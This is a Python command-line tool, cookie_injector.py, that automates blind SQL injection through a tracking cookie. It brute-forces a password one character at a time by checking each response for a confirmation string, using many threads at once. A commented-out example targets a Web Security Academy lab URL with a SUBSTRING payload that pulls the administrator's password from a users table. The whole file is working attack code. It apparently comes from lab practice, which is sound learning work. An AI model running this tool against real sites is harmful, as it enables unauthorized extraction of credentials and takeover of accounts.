#!/usr/bin/env python3.12
# cookie_injector.py ver 1.1

import datetime
import http.client
import json
import sys
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor
from queue import Queue

import click
import requests
from rich.console import Console
from rich.live import Live
from rich.markdown import Markdown
from rich.panel import Panel

from SQLInjector.brute_forcer import BruteForcer
from SQLInjector.cookie_injector_core import CookieInjector

# url = "https://0a6c002f031d991d81c225db00ea0044.web-security-academy.net/product?productId=13"
#
# code_to_inject = (
#     "' anD (SELECT SUBSTRING(password,{char_numb},1) FROM users WHERE username = 'administrator') = '{character}'--",
# )[0]
#
# password_length = 20
# payload_character_set = [letter for letter in string.ascii_letters] + [num for num in range(0, 10)]
# confirmation_string = b"Welcome"
# cookie = "TrackingId"

# threads = 20
# queues = [Queue() for queue in range(threads)]


class Injector:
    def __init__(self, target_url, confirm_string, cookie_name, passwd_length: int, char_set, inject_code,
                 max_threads: int):
        self.c = Console()
        self.url = target_url
        self.confirm_string = confirm_string
        self.cookie_name = cookie_name
        self.passwd_length = passwd_length
        self.char_set = char_set
        self.inject_code = inject_code
        self.max_threads = max_threads
        self.queues = [Queue() for _queue in range(self.max_threads)]
        self.found_characters = {}
        self.discard_seq_num = []
        self.debug_skipped = []
        self.status_code_to_description = {}

    def check_url(self):
        self.status_code_to_description = {code: description for code, description in http.client.responses.items()}
        try:
            response = requests.head(self.url)
            if response.status_code == 200:
                self.c.print(f"The URL is responding", style="green")
            self.c.print(
                f"Status code {response.status_code} -> {self.status_code_to_description[response.status_code]}.\n"
                f"Press CTRL+C to abort."
            )
        except requests.RequestException as e:
            self.c.print(f"Error: {e}")
            print()
            self.c.print(f"The URL {self.url} is not responding.", style="red")
            sys.exit(1)

    def brute_forcer(self):
        bf = BruteForcer(self.passwd_length, self.char_set, self.inject_code)
        for i, payload_kit in enumerate(bf.brute_force()):
            thread_id = i % self.max_threads
            self.queues[thread_id].put(payload_kit)

    def cookie_injector(self, inject_code, seq_num, char, start_time):
        if seq_num not in self.discard_seq_num:
            cookie_injector = CookieInjector(self.url, self.confirm_string, self.cookie_name)
            char_found = cookie_injector.run(inject_code, seq_num, char)
            if char_found:
                self.found_characters[f"Char {seq_num}"] = char
                self.discard_seq_num.append(seq_num)
                now = datetime.datetime.now()
                elapsed_time = now - start_time
                with Live():
                    self.c.print(
                        Panel(
                            f"{self.found_characters}\n"
                            f"Brute forced positions {len(self.discard_seq_num)} --> {self.discard_seq_num}\n"
                            f"Time elapsed {elapsed_time}",
                            title="Found Char",
                            title_align="left",
                            highlight=True
                        )
                    )
        else:
            pass


class StartInjector:
    def __init__(self, set_url, config_file_path, out_file, setup_utility):
        self.c = Console()
        self.futures = []
        self.start_time = None
        self.set_url = set_url
        self.config_file_path = config_file_path
        self.out_file = out_file
        self.setup_utility = setup_utility
        self.config = dict()
        self.injector = None
        self.setup = None

    def load_config(self) -> dict:
        try:
            with open(self.config_file_path, "r") as config_file:
                return dict(json.load(config_file))
        except FileNotFoundError:
            self.run_cookie_injector_setup()
            with open(self.config_file_path, "r") as config_file:
                return dict(json.load(config_file))

    def initialize_data(self) -> tuple:
        target_url = self.config.get("target_url")
        confirm_string = self.config.get("confirm_string").encode()
        cookie_name = self.config.get("cookie_name")
        passwd_length = int(self.config.get("passwd_length"))
        char_set = self.config.get("char_set")
        inject_code = self.config.get("inject_code")
        max_threads = int(self.config.get("max_threads"))
        return target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads

    def print_config_file(self) -> None:
        config_file_content = self.load_config()
        print()
        if not self.set_url:
            self.c.print(Markdown(f"**Using data from configuration file...**"))
            print()
        self.c.print(Markdown(f"# Configuration File Content"))
        self.c.print(config_file_content, style="black")

    def run_cookie_injector_setup(self) -> None:
        from SQLInjector import cookie_injector_setup
        self.setup = cookie_injector_setup.main
        self.setup()

    def thread_pool_executor(self, max_threads: int, passwd_length: int) -> None:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            for thread_id, working_queue in enumerate(self.injector.queues):
                while not working_queue.empty():
                    if len(self.injector.discard_seq_num) != passwd_length:
                        payload = working_queue.get()
                        future = executor.submit(
                            self.injector.cookie_injector,
                            payload.inject_code,
                            payload.sequence_num,
                            payload.character,
                            self.start_time
                        )
                        self.futures.append(future)
                    else:
                        self.kill_all_threads()
                        break

    def process_char_dict(self) -> str:
        found_characters = self.injector.found_characters
        ordered_passwd_dict = OrderedDict(sorted(found_characters.items(), key=lambda item: int(item[0].split()[1])))
        clear_text_passwd = ""
        for k, v in ordered_passwd_dict.items():
            clear_text_passwd += str(v)
        return clear_text_passwd

    def passwd_was_found(self, clear_text_passwd):
        message = f"Password successfully brute forced: {clear_text_passwd}"
        self.c.print(message, style="green")
        if self.out_file:
            with open(self.out_file, "w", encoding="utf-8") as output_file:
                output_file.write(message + "\n")
            self.c.print(f"Output file '{self.out_file}' created successfully.")

    def passwd_was_not_found(self):
        message = f"No password recovered."
        self.c.print(message, style="red")
        if self.out_file:
            with open(self.out_file, "w", encoding="utf-8") as output_file:
                output_file.write(message + "\n")
            self.c.print(f"Output file '{self.out_file}' created successfully.")

    def process_execution_time(self):
        end_time = datetime.datetime.now()
        run_time = end_time - self.start_time
        return run_time, end_time

    def process_passwd_data(self) -> None:
        clear_text_passwd = self.process_char_dict()
        run_time, end_time = self.process_execution_time()
        if len(clear_text_passwd) >= 1:
            self.passwd_was_found(clear_text_passwd)
        else:
            self.passwd_was_not_found()
        self.c.print(f"Completed in {run_time} seconds at {end_time}.", style="blue")

    def process_options(self):
        if self.setup_utility:
            self.run_cookie_injector_setup()
        self.config = self.load_config()
        if self.set_url:
            self.config["target_url"] = self.set_url
            print()
            self.c.print(Markdown(f"\n**Using custom URL...**\n- Target URL: {self.config.get("target_url")}"))
        return self.initialize_data()

    def kill_all_threads(self):
        for future in self.futures:
            future.cancel()
        self.futures = []

    def start_threads(self):
        try:
            target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads = (
                self.process_options()
            )
            self.print_config_file()
            self.injector = Injector(
                target_url, confirm_string, cookie_name, passwd_length, char_set, inject_code, max_threads
            )
            self.start_time = datetime.datetime.now()
            self.c.print(f"Start time {self.start_time}.", style="blue")
            self.injector.check_url()
            self.injector.brute_forcer()
            self.c.print(Markdown("# Brute forcing password..."))
            self.thread_pool_executor(max_threads, passwd_length)
            self.process_passwd_data()
        except KeyboardInterrupt:
            self.kill_all_threads()
            sys.exit("\n\nExiting, please wait.\n\nBye.\n")


@click.command(
    help="This app injects a cookie, sends the crafted request, "
         "and checks the response from the page content.\n"
         "It needs a JSON configuration file. You can edit this manually, "
         "at the path: 'config/cookie_injector.json'. The setup utility will "
         "run automatically, to create one, when launching cookie_injector.py "
         "without a configuration file in the config folder. Alternatively you "
         "can run it with the '-s' option."
)
@click.option(
    "-u", "--set-url", "set_url",
    help="Specify target URL instead of the one in config file.",
    required=False,
    type=str
)
@click.option(
    "-s", "--setup-utility", "setup_utility",
    help="Interactively edit the config file.",
    is_flag=True,
    required=False,
    default=False,
)
@click.option(
    "-f", "--config-file", "config_file_path",
    help="Path to config file.",
    default="config/cookie_injector.json",
    show_default=True,
    type=click.Path(exists=False),
    required=True
)
@click.option(
    "-o", "--out-file", "out_file",
    help="Path to output file with the recovered password.",
    type=click.Path(exists=False),
    required=False
)
def main(set_url, config_file_path, out_file, setup_utility):
    injector_starter = StartInjector(set_url, config_file_path, out_file, setup_utility)
    injector_starter.start_threads()


if __name__ == '__main__':
    main()
